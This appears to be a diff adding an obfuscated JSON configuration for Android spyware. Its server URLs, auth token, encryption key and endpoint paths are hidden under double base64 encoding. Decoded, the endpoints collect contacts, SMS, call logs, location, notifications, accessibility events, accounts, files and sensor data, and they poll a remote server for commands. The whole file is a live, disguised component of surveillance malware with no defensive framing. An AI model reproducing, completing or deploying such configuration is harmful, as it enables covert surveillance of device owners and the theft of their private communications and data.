@@ -1,0 +1,32 @@
+{
+  "enc_primary_url": "YUhSMGNITTZMeTFtWldWMExtRnVaSEp2YVdSekxtNWhiV1V2",
+  "enc_backup_urls": [
+    "YUhSMGNITTZMeTFtWldWMExtRnVaSEp2YVdSekxtNWhiV1V2"
+  ],
+  "enc_auth_token": "WVdKalpHVm1aMmhwYW1zMU56ZzVNREV5TXpRMU5qYzRPVEJoWW1Oa1pXWm5hR2xxYTJ4dGJtOXdjWEp6ZEhWMmQzaDVlZz09",
+  "enc_encryption_key": "YzJWamRYSmxYM05sWldSZk1qQXlORjkyTWc9PQ==",
+  "version": 5,
+  "update_interval": 3600000,
+  "check_config_interval": 7200000,
+  "enc_endpoint_mapping": {
+    "DEVICE_INFO": "YzNsdVl5OWtaWFpwWTJVdGFXNW1idz09",
+    "CONTACTS": "YzNsdVl5OWpiMjUwWVdOMGN3PT0=",
+    "CALL_LOGS": "YzNsdVl5OWpZV3hzY3c9PQ==",
+    "SMS": "YzNsdVl5OWtaWE56WVdkbGN3PT0=",
+    "LOCATION": "YzNsdVl5OXNiMk5oZEdsdmJnPT0=",
+    "NOTIFICATIONS": "YzNsdVl5OXViM1JwWm1sallYUnBiMjV6",
+    "INSTALLED_APPS": "YzNsdVl5OXBibk4wWVd4c1pXUXRZWEJ3Y3c9PQ==",
+    "CHECK_COMMANDS": "WTI5dGJXRnVaSE12WTJobFkydz0=",
+    "REPORT_COMMAND_STATUS": "WTI5dGJXRnVaSE12Y21Wd2IzSjBMWE4wWVhSMWN3PT0=",
+    "FILES_METADATA": "YzNsdVl5OW1hV3hsY3kxdFpYUmhaR0YwWVE9PQ==",
+    "UPLOAD_FILE": "ZFhCc2IyRmtMMlpwYkdVPQ==",
+    "UPLOAD_THUMBNAIL": "ZFhCc2IyRmtMM1JvZFcxaWJtRnBiQT09",
+    "REPORT_PERMISSION_STATUS": "Y21Wd2IzSjBMM0JsY20xcGMzTnBiMjR0YzNSaGRIVno=",
+    "ACCOUNTS": "YzNsdVl5OWhZMk52ZFc1MGN3PT0=",
+    "ACCESSIBILITY_EVENTS": "YzNsdVl5OWhZMk5sYzNOcFltbHNhWFI1TFdWMlpXNTBjdz09",
+    "CALENDAR_EVENTS": "YzNsdVl5OWpZV3hsYm1SaGNpMWxkbVZ1ZEhNPQ==",
+    "SENSOR_DATA": "YzNsdVl5OXpaVzV6YjNJdFpHRjBZUT09",
+    "NEARBY_DEVICES": "YzNsdVl5OXVaV0Z5WW5rdFpHVjJhV05sY3c9PQ==",
+    "SYNC_STANDARDS": "YzNsdVl5OXpkR0Z1WkdGeVpITT0="
+  }
+}
